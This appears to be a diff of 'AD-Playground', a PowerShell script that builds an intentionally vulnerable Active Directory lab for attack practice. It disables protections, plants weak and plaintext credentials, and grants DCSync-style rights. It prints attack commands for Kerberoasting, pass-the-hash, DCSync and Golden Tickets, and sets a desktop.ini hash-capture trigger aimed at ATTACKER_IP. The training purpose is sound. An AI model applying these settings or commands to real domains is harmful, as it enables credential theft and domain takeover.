@@ -1,7 +1,7 @@
-#Requires -RunAsAdministrator
+﻿#Requires -RunAsAdministrator
 <#
 .SYNOPSIS
-    AD-Playground — Interactive Vulnerable Active Directory Lab Environment
+    AD-Playground  -  Interactive Vulnerable Active Directory Lab Environment
 .DESCRIPTION
     A single-script lab that transforms any Windows Server into a fully
     populated, intentionally vulnerable Active Directory environment for
@@ -16,7 +16,7 @@
 Set-StrictMode -Off
 $ErrorActionPreference = "SilentlyContinue"
 
-# ── Console encoding — required for Unicode box/block chars on WS 2016 ──────
+# ── Console encoding  -  required for Unicode box/block chars on WS 2016 ──────
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $OutputEncoding           = [System.Text.Encoding]::UTF8
 chcp 65001 | Out-Null
@@ -38,14 +38,14 @@ $Global:ADPConfig = @{
     DomainDN     = $null
     # All passwords are confirmed present in rockyou.txt (or crackable with
     # hashcat best64 rules). Difficulty varies intentionally across accounts.
-    BasePwd      = "Password1"        # rockyou ✓  — regular employees
-    WeakPwd      = "Password123"      # rockyou ✓  — spray target baseline
-    ServicePwd   = "Monkey1"          # rockyou ✓  — service accounts (medium)
+    BasePwd      = "Password1"        # rockyou ✓   -  regular employees
+    WeakPwd      = "Password123"      # rockyou ✓   -  spray target baseline
+    ServicePwd   = "Monkey1"          # rockyou ✓   -  service accounts (medium)
 }
 
 $Global:ADPState = @{
     BaselineReady = $false
-    ActiveLabs    = [System.Collections.ArrayList]@()   # must be ArrayList — fixed arrays have no .Add()
+    ActiveLabs    = [System.Collections.ArrayList]@()   # must be ArrayList  -  fixed arrays have no .Add()
     DeployedAt    = @{}
 }
 
@@ -171,7 +171,7 @@ function Load-State {
         try {
             $loaded = Get-Content $Global:ADPConfig.StateFile -Raw | ConvertFrom-Json
             $Global:ADPState.BaselineReady = [bool]$loaded.BaselineReady
-            # Guard against null ActiveLabs in JSON — null would add a null element to the list
+            # Guard against null ActiveLabs in JSON  -  null would add a null element to the list
             if ($loaded.ActiveLabs) {
                 $Global:ADPState.ActiveLabs = [System.Collections.ArrayList]@($loaded.ActiveLabs)
             } else {
@@ -183,7 +183,7 @@ function Load-State {
             }
             $Global:ADPState.DeployedAt = $h
         } catch {
-            # Corrupt state file — start fresh
+            # Corrupt state file  -  start fresh
             $Global:ADPState.ActiveLabs = [System.Collections.ArrayList]@()
             $Global:ADPState.DeployedAt = @{}
         }
@@ -226,7 +226,7 @@ function Assert-Baseline {
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  BASELINE — AD DS INSTALL + USER POPULATION
+#  BASELINE  -  AD DS INSTALL + USER POPULATION
 # ─────────────────────────────────────────────────────────────────────────────
 function Invoke-BaselineSetup {
     Write-Banner
@@ -413,7 +413,7 @@ function Get-DomainDN {
 function Show-LabHints {
     param([string]$LabName, [string[]]$Hints)
     Write-Banner
-    Write-SectionHeader "Hints — $LabName"
+    Write-SectionHeader "Hints  -  $LabName"
     $i = 1
     foreach ($h in $Hints) {
         Write-Host ""
@@ -432,7 +432,7 @@ function Invoke-LabValidation {
     if ($result) {
         Write-Host ""
         Write-Color "  ╔══════════════════════════════════════╗" Green
-        Write-Color "  ║    LAB VALIDATED — WELL DONE!        ║" Green
+        Write-Color "  ║    LAB VALIDATED  -  WELL DONE!        ║" Green
         Write-Color "  ╚══════════════════════════════════════╝" Green
     } else {
         Write-Status "Validation not yet passed. Keep going!" WARN
@@ -444,7 +444,7 @@ function Invoke-LabValidation {
 #  ══════════════════════  ENUMERATION LABS  ═══════════════════════════════
 # ─────────────────────────────────────────────────────────────────────────────
 
-# E1 — LDAP Null / Authenticated Enumeration
+# E1  -  LDAP Null / Authenticated Enumeration
 function Deploy-Lab-E1 {
     $dn = Get-DomainDN
     Write-Status "Enabling LDAP null session (pre-Win2003 compat)..." WORK
@@ -479,7 +479,7 @@ function Teardown-Lab-E1 {
     Write-Status "Lab E1 cleaned." OK
 }
 
-# E2 — SMB Null Sessions & Share Enumeration
+# E2  -  SMB Null Sessions & Share Enumeration
 function Deploy-Lab-E2 {
     Write-Status "Configuring SMB for null session access..." WORK
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RestrictNullSessAccess" -Value 0 -ErrorAction SilentlyContinue
@@ -492,7 +492,7 @@ function Deploy-Lab-E2 {
     "Server list for maintenance" | Set-Content "$sharePath\servers.txt" -Encoding UTF8
     New-SmbShare -Name "IT_Share" -Path $sharePath -FullAccess "Everyone" -ErrorAction SilentlyContinue
     Add-ActiveLab "E2-SMB-Enum"
-    Write-Status "Lab E2 deployed. Share: \\localhost\IT_Share — null sessions enabled." OK
+    Write-Status "Lab E2 deployed. Share: \\localhost\IT_Share  -  null sessions enabled." OK
 }
 
 function Teardown-Lab-E2 {
@@ -505,7 +505,7 @@ function Teardown-Lab-E2 {
     Write-Status "Lab E2 cleaned." OK
 }
 
-# E3 — SPN Enumeration
+# E3  -  SPN Enumeration
 function Deploy-Lab-E3 {
     Write-Status "Setting up SPN enumeration targets..." WORK
     # SPNs already set on svc_backup, svc_sql, svc_web during baseline
@@ -523,7 +523,7 @@ function Teardown-Lab-E3 {
     Write-Status "Lab E3 cleaned." OK
 }
 
-# E4 — BloodHound / SharpHound Data Collection Setup
+# E4  -  BloodHound / SharpHound Data Collection Setup
 function Deploy-Lab-E4 {
     $dn = Get-DomainDN
     Write-Status "Creating complex ACL relationships for BloodHound analysis..." WORK
@@ -567,7 +567,7 @@ function Teardown-Lab-E4 {
     Write-Status "Lab E4 cleaned." OK
 }
 
-# E5 — PowerView Target Setup
+# E5  -  PowerView Target Setup
 function Deploy-Lab-E5 {
     $dn = Get-DomainDN
     Write-Status "Creating PowerView-discoverable misconfigurations..." WORK
@@ -589,7 +589,7 @@ function Teardown-Lab-E5 {
     Write-Status "Lab E5 cleaned." OK
 }
 
-# E6 — DNS Zone Transfer
+# E6  -  DNS Zone Transfer
 function Deploy-Lab-E6 {
     Write-Status "Enabling DNS zone transfers (any server)..." WORK
     $zone = $Global:ADPConfig.Domain
@@ -606,7 +606,7 @@ function Teardown-Lab-E6 {
     Write-Status "Lab E6 cleaned." OK
 }
 
-# E7 — RPC Enumeration
+# E7  -  RPC Enumeration
 function Deploy-Lab-E7 {
     Write-Status "Enabling RPC null session enumeration..." WORK
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name "RestrictAnonymous" -Value 0 -ErrorAction SilentlyContinue
@@ -623,7 +623,7 @@ function Teardown-Lab-E7 {
     Write-Status "Lab E7 cleaned." OK
 }
 
-# E8 — GPO / GPP Password Enumeration
+# E8  -  GPO / GPP Password Enumeration
 function Deploy-Lab-E8 {
     Write-Status "Planting GPP password entry in SYSVOL..." WORK
     $domain  = $Global:ADPConfig.Domain
@@ -631,8 +631,8 @@ function Deploy-Lab-E8 {
     $gppGuid = "{ADP00001-0000-0000-0000-000000000001}"
     $gppPath = "$sysvolPath\$gppGuid\Machine\Preferences\Groups"
     New-Item -ItemType Directory -Force -Path $gppPath | Out-Null
-    # GPP cpassword — encrypts "password123" using the public MS AES key (rockyou ✓)
-    # Decrypt with: gpp-decrypt <cpassword>  or  Get-GPPPassword (PowerSploit)
+    # GPP cpassword  -  encrypts "password123" using the public MS AES key (rockyou ✓)
+    # Decrypt with: gpp-decrypt [cpassword]  or  Get-GPPPassword (PowerSploit)
     $encPwd = "j1Uyj3Wjk0nHkGBDEGBjGw=="
     $xmlContent = @"
 <?xml version="1.0" encoding="UTF-8"?>
@@ -661,7 +661,7 @@ function Deploy-Lab-E8 {
     $cpwdXml | Set-Content "$svcPath\Services.xml" -Encoding UTF8
     Add-ActiveLab "E8-GPP-Password"
     Write-Status "Lab E8 deployed. GPP cpassword planted at: $sysvolPath\$gppGuid" OK
-    Write-Status "Decrypt with: gpp-decrypt <cpassword> or Get-GPPPassword (PowerSploit)" INFO
+    Write-Status "Decrypt with: gpp-decrypt [cpassword] or Get-GPPPassword (PowerSploit)" INFO
 }
 
 function Teardown-Lab-E8 {
@@ -672,7 +672,7 @@ function Teardown-Lab-E8 {
     Write-Status "Lab E8 cleaned." OK
 }
 
-# E9 — User Enumeration (Kerbrute / OSINT targets)
+# E9  -  User Enumeration (Kerbrute / OSINT targets)
 function Deploy-Lab-E9 {
     Write-Status "Creating user enumeration targets (AS-REP candidates, valid user list)..." WORK
     $users = @("jsmith","mjohnson","rwilliams","lbrown","djones")
@@ -699,7 +699,7 @@ function Teardown-Lab-E9 {
     Write-Status "Lab E9 cleaned." OK
 }
 
-# E10 — Trust Enumeration
+# E10  -  Trust Enumeration
 function Deploy-Lab-E10 {
     Write-Status "Configuring trust enumeration artefacts..." WORK
     # Create a dummy trust object to enumerate (one-way external trust simulation)
@@ -729,7 +729,7 @@ function Teardown-Lab-E10 {
 #  ══════════════════  CREDENTIAL ATTACK LABS  ═════════════════════════════
 # ─────────────────────────────────────────────────────────────────────────────
 
-# C1 — AS-REP Roasting
+# C1  -  AS-REP Roasting
 function Deploy-Lab-C1 {
     Write-Status "Enabling AS-REP Roasting targets..." WORK
     $targets = @("jdoe_legacy","svc_legacy","analyst01")
@@ -738,7 +738,7 @@ function Deploy-Lab-C1 {
     }
     Add-ActiveLab "C1-ASREP-Roasting"
     Write-Status "Lab C1 deployed. AS-REP targets: $($targets -join ', ')" OK
-    Write-Status "Attack: GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat" INFO
+    Write-Status "Attack: GetNPUsers.py [domain]/ -usersfile users.txt -format hashcat" INFO
 }
 
 function Teardown-Lab-C1 {
@@ -750,17 +750,17 @@ function Teardown-Lab-C1 {
     Write-Status "Lab C1 cleaned." OK
 }
 
-# C2 — Kerberoasting
+# C2  -  Kerberoasting
 function Deploy-Lab-C2 {
     Write-Status "Setting up Kerberoasting targets (SPNs on weak-password accounts)..." WORK
     Set-ADUser -Identity "svc_sql"    -ServicePrincipalNames @{Add="MSSQLSvc/sql01:1433"} -ErrorAction SilentlyContinue
     Set-ADUser -Identity "svc_web"    -ServicePrincipalNames @{Add="HTTP/web01"} -ErrorAction SilentlyContinue
     Set-ADUser -Identity "svc_backup" -ServicePrincipalNames @{Add="HOST/backup01"} -ErrorAction SilentlyContinue
     # Passwords already set during baseline to rockyou.txt entries (dragon / sunshine)
-    # No reset needed — intentionally left as-is for cracking practice
+    # No reset needed  -  intentionally left as-is for cracking practice
     Add-ActiveLab "C2-Kerberoasting"
     Write-Status "Lab C2 deployed. Kerberoastable: svc_sql, svc_web, svc_backup" OK
-    Write-Status "Attack: GetUserSPNs.py <domain>/<user>:<pwd> -request" INFO
+    Write-Status "Attack: GetUserSPNs.py [domain]/[user]:[pwd] -request" INFO
 }
 
 function Teardown-Lab-C2 {
@@ -768,15 +768,15 @@ function Teardown-Lab-C2 {
     Write-Status "Lab C2 cleaned (SPNs remain from baseline; passwords reset to service default)." OK
 }
 
-# C3 — Password Spraying
+# C3  -  Password Spraying
 function Deploy-Lab-C3 {
     Write-Status "Setting up password spray targets (weak common passwords)..." WORK
-    # Passwords already set at baseline — all confirmed in rockyou.txt
+    # Passwords already set at baseline  -  all confirmed in rockyou.txt
     # jdoe_legacy → Welcome1  |  svc_legacy → abc123  |  helpdesk01 → Password1
     # Ensure fine-grained password policy doesn't lockout too fast
     Add-ActiveLab "C3-Password-Spray"
     Write-Status "Lab C3 deployed. Spray targets with rockyou.txt passwords: Welcome1, abc123, Password1" OK
-    Write-Status "Attack: kerbrute passwordspray --dc <IP> --domain <DOMAIN> users.txt <password>" INFO
+    Write-Status "Attack: kerbrute passwordspray --dc [IP] --domain [DOMAIN] users.txt [password]" INFO
 }
 
 function Teardown-Lab-C3 {
@@ -784,7 +784,7 @@ function Teardown-Lab-C3 {
     Write-Status "Lab C3 cleaned." OK
 }
 
-# C4 — LLMNR / NBT-NS Poisoning
+# C4  -  LLMNR / NBT-NS Poisoning
 function Deploy-Lab-C4 {
     Write-Status "Enabling LLMNR and NBT-NS (disabled by default on 2019/2022)..." WORK
     # Enable LLMNR via registry
@@ -800,7 +800,7 @@ function Deploy-Lab-C4 {
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0 -ErrorAction SilentlyContinue
     Add-ActiveLab "C4-LLMNR-Poisoning"
     Write-Status "Lab C4 deployed. LLMNR + NBT-NS enabled, SMB signing not required." OK
-    Write-Status "Attack: responder -I <iface> -wdF  then ntlmrelayx.py" INFO
+    Write-Status "Attack: responder -I [iface] -wdF  then ntlmrelayx.py" INFO
 }
 
 function Teardown-Lab-C4 {
@@ -814,7 +814,7 @@ function Teardown-Lab-C4 {
     Write-Status "Lab C4 cleaned." OK
 }
 
-# C5 — Credentials in AD Attributes
+# C5  -  Credentials in AD Attributes
 function Deploy-Lab-C5 {
     Write-Status "Planting credentials in AD user attributes..." WORK
     Set-ADUser -Identity "svc_backup"  -Description "Pwd: Monkey1 | Backup system account" -ErrorAction SilentlyContinue
@@ -833,12 +833,12 @@ function Teardown-Lab-C5 {
     Write-Status "Lab C5 cleaned." OK
 }
 
-# C6 — NTLMv2 Hash Capture (UNC trigger)
+# C6  -  NTLMv2 Hash Capture (UNC trigger)
 function Deploy-Lab-C6 {
     Write-Status "Placing UNC path trigger for NTLMv2 hash capture..." WORK
     $trigger = "C:\ADPLab_NTLMTrigger"
     New-Item -ItemType Directory -Force $trigger | Out-Null
-    # desktop.ini trick — opens a UNC path when folder is browsed
+    # desktop.ini trick  -  opens a UNC path when folder is browsed
     $ini = @"
 [.ShellClassInfo]
 IconResource=\\ATTACKER_IP\share\icon.ico
@@ -876,7 +876,7 @@ function Set-ADLabACE {
     Set-Acl "AD:\$TargetDN" $acl -ErrorAction SilentlyContinue
 }
 
-# A1 — WriteDACL on Domain Object
+# A1  -  WriteDACL on Domain Object
 function Deploy-Lab-A1 {
     Write-Status "Granting helpdesk01 WriteDACL on the domain object..." WORK
     $sid = (Get-ADUser "helpdesk01").SID
@@ -895,7 +895,7 @@ function Teardown-Lab-A1 {
     Write-Status "Lab A1 cleaned." OK
 }
 
-# A2 — GenericAll on User
+# A2  -  GenericAll on User
 function Deploy-Lab-A2 {
     Write-Status "Granting helpdesk01 GenericAll over dbadmin..." WORK
     $sid    = (Get-ADUser "helpdesk01").SID
@@ -914,7 +914,7 @@ function Teardown-Lab-A2 {
     Write-Status "Lab A2 cleaned." OK
 }
 
-# A3 — GenericWrite on User
+# A3  -  GenericWrite on User
 function Deploy-Lab-A3 {
     Write-Status "Granting analyst01 GenericWrite over svc_sql..." WORK
     $sid    = (Get-ADUser "analyst01").SID
@@ -933,7 +933,7 @@ function Teardown-Lab-A3 {
     Write-Status "Lab A3 cleaned." OK
 }
 
-# A4 — ForceChangePassword
+# A4  -  ForceChangePassword
 function Deploy-Lab-A4 {
     Write-Status "Granting helpdesk01 ForceChangePassword over multiple users..." WORK
     $sid     = (Get-ADUser "helpdesk01").SID
@@ -977,7 +977,7 @@ function Teardown-Lab-A4 {
     Write-Status "Lab A4 cleaned." OK
 }
 
-# A5 — AddMember (Self) to Privileged Group
+# A5  -  AddMember (Self) to Privileged Group
 function Deploy-Lab-A5 {
     Write-Status "Granting analyst01 ability to add members to IT-Admins group..." WORK
     $sid    = (Get-ADUser "analyst01").SID
@@ -1013,7 +1013,7 @@ function Teardown-Lab-A5 {
 #  ════════════════════  DELEGATION LABS  ══════════════════════════════════
 # ─────────────────────────────────────────────────────────────────────────────
 
-# D1 — Unconstrained Delegation
+# D1  -  Unconstrained Delegation
 function Deploy-Lab-D1 {
     Write-Status "Enabling Unconstrained Delegation on a computer account..." WORK
     $compName = $env:COMPUTERNAME
@@ -1033,7 +1033,7 @@ function Teardown-Lab-D1 {
     Write-Status "Lab D1 cleaned." OK
 }
 
-# D2 — Constrained Delegation
+# D2  -  Constrained Delegation
 function Deploy-Lab-D2 {
     Write-Status "Configuring Constrained Delegation on svc_sql..." WORK
     $dc = (Get-ADDomainController).Name
@@ -1041,7 +1041,7 @@ function Deploy-Lab-D2 {
     Set-ADAccountControl -Identity "svc_sql" -TrustedToAuthForDelegation $true -ErrorAction SilentlyContinue
     Add-ActiveLab "D2-Constrained-Delegation"
     Write-Status "Lab D2 deployed. svc_sql trusted to delegate to CIFS on $dc (Protocol Transition enabled)." OK
-    Write-Status "Exploit: getST.py -spn cifs/$dc -impersonate Administrator -dc-ip <DC> <domain>/svc_sql:<pwd>" INFO
+    Write-Status "Exploit: getST.py -spn cifs/$dc -impersonate Administrator -dc-ip [DC] [domain]/svc_sql:[pwd]" INFO
 }
 
 function Teardown-Lab-D2 {
@@ -1051,7 +1051,7 @@ function Teardown-Lab-D2 {
     Write-Status "Lab D2 cleaned." OK
 }
 
-# D3 — Resource-Based Constrained Delegation (RBCD)
+# D3  -  Resource-Based Constrained Delegation (RBCD)
 function Deploy-Lab-D3 {
     Write-Status "Setting up RBCD abuse path..." WORK
     $compName = $env:COMPUTERNAME
@@ -1088,7 +1088,7 @@ function Teardown-Lab-D3 {
 #  ══════════════════  LATERAL MOVEMENT LABS  ══════════════════════════════
 # ─────────────────────────────────────────────────────────────────────────────
 
-# L1 — Pass-the-Hash Setup
+# L1  -  Pass-the-Hash Setup
 function Deploy-Lab-L1 {
     Write-Status "Setting up Pass-the-Hash targets..." WORK
     # Disable Protected Users / credential guard where possible
@@ -1096,14 +1096,14 @@ function Deploy-Lab-L1 {
     Add-ADGroupMember -Identity "Administrators" -Members "itadmin" -ErrorAction SilentlyContinue
     # Disable RestrictedAdmin mode for demo
     Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -ErrorAction SilentlyContinue
-    # Create a local admin with a rockyou.txt password (football — confirmed present)
+    # Create a local admin with a rockyou.txt password (football  -  confirmed present)
     $localPwd = "football"
     $localUser = "lab_localadmin"
     net user $localUser $localPwd /add 2>$null
     net localgroup Administrators $localUser /add 2>$null
     Add-ActiveLab "L1-Pass-The-Hash"
     Write-Status "Lab L1 deployed. Local admin: $localUser / $localPwd" OK
-    Write-Status "Exploit: secretsdump.py then psexec.py / wmiexec.py -hashes <NTLM>" INFO
+    Write-Status "Exploit: secretsdump.py then psexec.py / wmiexec.py -hashes [NTLM]" INFO
 }
 
 function Teardown-Lab-L1 {
@@ -1112,7 +1112,7 @@ function Teardown-Lab-L1 {
     Write-Status "Lab L1 cleaned." OK
 }
 
-# L2 — Overpass-the-Hash / Pass-the-Key
+# L2  -  Overpass-the-Hash / Pass-the-Key
 function Deploy-Lab-L2 {
     Write-Status "Enabling Overpass-the-Hash conditions (RC4/AES key abuse)..." WORK
     # Disable AES enforcement to allow RC4 fallback (Kerberos encryption downgrade)
@@ -1122,7 +1122,7 @@ function Deploy-Lab-L2 {
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "AllowTGTSessionKey" -Value 1 -ErrorAction SilentlyContinue
     Add-ActiveLab "L2-Overpass-The-Hash"
     Write-Status "Lab L2 deployed. RC4 allowed for svc_sql, svc_web. TGT session key exported." OK
-    Write-Status "Exploit: sekurlsa::pth /user:svc_sql /domain:<d> /ntlm:<hash> in Mimikatz" INFO
+    Write-Status "Exploit: sekurlsa::pth /user:svc_sql /domain:[d] /ntlm:[hash] in Mimikatz" INFO
 }
 
 function Teardown-Lab-L2 {
@@ -1133,7 +1133,7 @@ function Teardown-Lab-L2 {
     Write-Status "Lab L2 cleaned." OK
 }
 
-# L3 — Pass-the-Ticket
+# L3  -  Pass-the-Ticket
 function Deploy-Lab-L3 {
     Write-Status "Setting up Pass-the-Ticket targets..." WORK
     # Ensure svc_sql has active sessions and delegation configured
@@ -1152,7 +1152,7 @@ function Deploy-Lab-L3 {
     }
     Add-ActiveLab "L3-Pass-The-Ticket"
     Write-Status "Lab L3 deployed. Ticket lifetime extended. Target: svc_sql TGS." OK
-    Write-Status "Exploit: Rubeus dump /service:krbtgt then ptt /ticket:<b64>" INFO
+    Write-Status "Exploit: Rubeus dump /service:krbtgt then ptt /ticket:[b64]" INFO
 }
 
 function Teardown-Lab-L3 {
@@ -1164,7 +1164,7 @@ function Teardown-Lab-L3 {
 #  ════════════════════  PERSISTENCE LABS  ═════════════════════════════════
 # ─────────────────────────────────────────────────────────────────────────────
 
-# P1 — AdminSDHolder Backdoor
+# P1  -  AdminSDHolder Backdoor
 function Deploy-Lab-P1 {
     Write-Status "Adding analyst01 ACE to AdminSDHolder container..." WORK
     $dn        = Get-DomainDN
@@ -1194,7 +1194,7 @@ function Teardown-Lab-P1 {
     Write-Status "Lab P1 cleaned." OK
 }
 
-# P2 — DCSync Rights
+# P2  -  DCSync Rights
 function Deploy-Lab-P2 {
     Write-Status "Granting analyst01 DCSync replication rights on domain..." WORK
     $dn  = Get-DomainDN
@@ -1217,7 +1217,7 @@ function Deploy-Lab-P2 {
     Set-Acl "AD:\$dn" $acl -ErrorAction SilentlyContinue
     Add-ActiveLab "P2-DCSync"
     Write-Status "Lab P2 deployed. analyst01 has DCSync rights." OK
-    Write-Status "Exploit: secretsdump.py <domain>/analyst01:<pwd>@<dc_ip>" INFO
+    Write-Status "Exploit: secretsdump.py [domain]/analyst01:[pwd]@[dc_ip]" INFO
 }
 
 function Teardown-Lab-P2 {
@@ -1229,7 +1229,7 @@ function Teardown-Lab-P2 {
     Write-Status "Lab P2 cleaned." OK
 }
 
-# P3 — Shadow Credentials
+# P3  -  Shadow Credentials
 function Deploy-Lab-P3 {
     Write-Status "Granting helpdesk01 write access to msDS-KeyCredentialLink on dbadmin..." WORK
     $sid    = (Get-ADUser "helpdesk01").SID
@@ -1262,7 +1262,7 @@ function Teardown-Lab-P3 {
     Write-Status "Lab P3 cleaned." OK
 }
 
-# P4 — Golden Ticket Prerequisites
+# P4  -  Golden Ticket Prerequisites
 function Deploy-Lab-P4 {
     Write-Status "Setting up Golden Ticket lab conditions..." WORK
     # Lower krbtgt password age (so it won't rotate during lab)
@@ -1270,8 +1270,8 @@ function Deploy-Lab-P4 {
     Deploy-Lab-P2
     # Extend ticket lifetime in policy
     Write-Host ""
-    Write-Status "Golden Ticket requires krbtgt NTLM hash — obtain via DCSync after completing P2." WARN
-    Write-Status "Then: ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> -domain <DOMAIN> Administrator" INFO
+    Write-Status "Golden Ticket requires krbtgt NTLM hash  -  obtain via DCSync after completing P2." WARN
+    Write-Status "Then: ticketer.py -nthash [krbtgt_hash] -domain-sid [SID] -domain [DOMAIN] Administrator" INFO
     Add-ActiveLab "P4-Golden-Ticket"
     Write-Status "Lab P4 deployed. P2 (DCSync) also deployed as prerequisite." OK
 }
@@ -1288,43 +1288,43 @@ function Teardown-Lab-P4 {
 
 $Global:Scenarios = @{
     1 = @{
-        Name        = "Easy — New Hire Foothold"
+        Name        = "Easy  -  New Hire Foothold"
         Description = "Classic entry-level chain: enumerate the domain, find accounts with no pre-auth, crack offline, then spray weak passwords."
         Chain       = @("E9","C1","C3","C5","E3")
         Teardown    = @("E9","C1","C3","C5","E3")
     }
     2 = @{
-        Name        = "Medium — Internal Pivot"
+        Name        = "Medium  -  Internal Pivot"
         Description = "Network poisoning chain: capture NTLMv2 via LLMNR, relay or crack it, enumerate ACLs, abuse WriteDACL to grant DCSync."
         Chain       = @("E2","C4","C6","E4","A1")
         Teardown    = @("E2","C4","C6","E4","A1")
     }
     3 = @{
-        Name        = "Hard — Full Domain Takeover"
+        Name        = "Hard  -  Full Domain Takeover"
         Description = "Delegation to DA: exploit RBCD as low-priv user, obtain TGS, pivot to shadow credentials, then DCSync."
         Chain       = @("E3","D3","D2","P3","P2")
         Teardown    = @("E3","D3","D2","P3","P2")
     }
     4 = @{
-        Name        = "APT Simulation — Stealthy Operator"
+        Name        = "APT Simulation  -  Stealthy Operator"
         Description = "Recon with BloodHound, abuse GenericAll ACE, pivot through constrained delegation, plant AdminSDHolder backdoor."
         Chain       = @("E4","A2","D2","P1")
         Teardown    = @("E4","A2","D2","P1")
     }
     5 = @{
-        Name        = "Misconfig Hunt — The Auditor"
+        Name        = "Misconfig Hunt  -  The Auditor"
         Description = "Credential hunting across GPP, attributes, and ACL misconfigurations escalating to domain admin."
         Chain       = @("E8","C5","A3","A5","P2")
         Teardown    = @("E8","C5","A3","A5","P2")
     }
     6 = @{
-        Name        = "Trust Attack — Cross Domain"
+        Name        = "Trust Attack  -  Cross Domain"
         Description = "Enumerate trusts, abuse SID history artefacts, escalate via writeable computer objects."
         Chain       = @("E10","E1","D3","A2","P2")
         Teardown    = @("E10","E1","D3","A2","P2")
     }
     7 = @{
-        Name        = "Quick CTF — Speed Run (Random)"
+        Name        = "Quick CTF  -  Speed Run (Random)"
         Description = "3 random labs deployed. Race the clock!"
         Chain       = @()   # dynamically populated
         Teardown    = @()
@@ -1364,7 +1364,7 @@ function Invoke-Scenario {
     if (-not (Assert-Baseline)) { return }
     $s = $Global:Scenarios[$Id]
 
-    # Speed run — random 3 labs
+    # Speed run  -  random 3 labs
     if ($Id -eq 7) {
         $all   = $Global:LabDeployMap.Keys | Get-Random -Count 3
         $s.Chain    = [array]$all
@@ -1409,36 +1409,36 @@ function Teardown-Scenario {
 # ─────────────────────────────────────────────────────────────────────────────
 $Global:LabHints = @{
     "E1"  = @("Use ldapsearch or ldapdomaindump against port 389","Filter for Description attributes: Get-ADUser -Filter * -Properties Description | Where {`$_.Description}","jdoe_legacy has credentials stored in plaintext in the Description field")
-    "E2"  = @("Try: smbclient -L //<DC_IP>/ -N","Look for readable shares with smbmap -H <IP> -u '' -p ''","The IT_Share contains files with juicy filenames — what do they say?")
-    "E3"  = @("Find SPNs: GetUserSPNs.py <domain>/<user>:<pwd> -dc-ip <IP>","PowerView: Get-DomainUser -SPN","Service accounts with SPNs and weak passwords are Kerberoastable")
-    "E4"  = @("Run SharpHound: SharpHound.exe -c All","Import the zip into BloodHound","Look for shortest paths to Domain Admins — what's the first hop?")
+    "E2"  = @("Try: smbclient -L //[DC_IP]/ -N","Look for readable shares with smbmap -H [IP] -u '' -p ''","The IT_Share contains files with juicy filenames  -  what do they say?")
+    "E3"  = @("Find SPNs: GetUserSPNs.py [domain]/[user]:[pwd] -dc-ip [IP]","PowerView: Get-DomainUser -SPN","Service accounts with SPNs and weak passwords are Kerberoastable")
+    "E4"  = @("Run SharpHound: SharpHound.exe -c All","Import the zip into BloodHound","Look for shortest paths to Domain Admins  -  what's the first hop?")
     "E5"  = @("PowerView: Get-DomainUser -UACFilter DONT_REQ_PREAUTH","Check: Get-ADUser -Filter * -Properties adminCount | Where {`$_.adminCount -eq 1}","Users with passwords in Description: Get-ADUser -Filter * -Properties Description")
-    "E6"  = @("Test zone transfer: dig axfr <domain> @<DC_IP>","Or: nmap --script dns-zone-transfer -p 53 <DC_IP>","What hostnames are revealed that DNS normally hides?")
-    "E7"  = @("Test: rpcclient -U '' -N <DC_IP>","Try enumdomusers, enumdomgroups inside rpcclient","What info can you gather as an anonymous user?")
-    "E8"  = @("SYSVOL is readable by all domain users: ls \\<DC>\SYSVOL","Look for Groups.xml or Services.xml files","Decrypt cpassword with gpp-decrypt or Get-GPPPassword")
-    "E9"  = @("Enumerate users with Kerbrute: kerbrute userenum --dc <IP> --domain <DOM> users.txt","Find AS-REP roastable users: GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat","Crack the hash offline with hashcat -m 18200")
+    "E6"  = @("Test zone transfer: dig axfr [domain] @[DC_IP]","Or: nmap --script dns-zone-transfer -p 53 [DC_IP]","What hostnames are revealed that DNS normally hides?")
+    "E7"  = @("Test: rpcclient -U '' -N [DC_IP]","Try enumdomusers, enumdomgroups inside rpcclient","What info can you gather as an anonymous user?")
+    "E8"  = @("SYSVOL is readable by all domain users: ls \\[DC]\SYSVOL","Look for Groups.xml or Services.xml files","Decrypt cpassword with gpp-decrypt or Get-GPPPassword")
+    "E9"  = @("Enumerate users with Kerbrute: kerbrute userenum --dc [IP] --domain [DOM] users.txt","Find AS-REP roastable users: GetNPUsers.py [domain]/ -usersfile users.txt -format hashcat","Crack the hash offline with hashcat -m 18200")
     "E10" = @("Enumerate trusts: Get-ADTrust -Filter * or nltest /domain_trusts","PowerView: Get-DomainTrust","What direction is the trust? How can SID history abuse cross it?")
-    "C1"  = @("Find targets: GetNPUsers.py <domain>/ -request -no-pass -usersfile users.txt","The hash format is Kerberos 5 AS-REQ Pre-Auth etype 23 (hashcat mode 18200)","Wordlist: rockyou.txt — these passwords are intentionally weak")
-    "C2"  = @("Request TGS: GetUserSPNs.py <domain>/<user>:<pwd> -request -dc-ip <IP>","Crack with hashcat -m 13100 (Kerberos 5 TGS-REP etype 23)","Which service accounts have weak passwords? Try common service passwords")
-    "C3"  = @("Common enterprise passwords to spray: Welcome1, Password1, abc123, letmein","Spray slowly — 1 attempt per user every 30 min to avoid lockout","kerbrute passwordspray or Spray-Passwords.ps1")
+    "C1"  = @("Find targets: GetNPUsers.py [domain]/ -request -no-pass -usersfile users.txt","The hash format is Kerberos 5 AS-REQ Pre-Auth etype 23 (hashcat mode 18200)","Wordlist: rockyou.txt  -  these passwords are intentionally weak")
+    "C2"  = @("Request TGS: GetUserSPNs.py [domain]/[user]:[pwd] -request -dc-ip [IP]","Crack with hashcat -m 13100 (Kerberos 5 TGS-REP etype 23)","Which service accounts have weak passwords? Try common service passwords")
+    "C3"  = @("Common enterprise passwords to spray: Welcome1, Password1, abc123, letmein","Spray slowly  -  1 attempt per user every 30 min to avoid lockout","kerbrute passwordspray or Spray-Passwords.ps1")
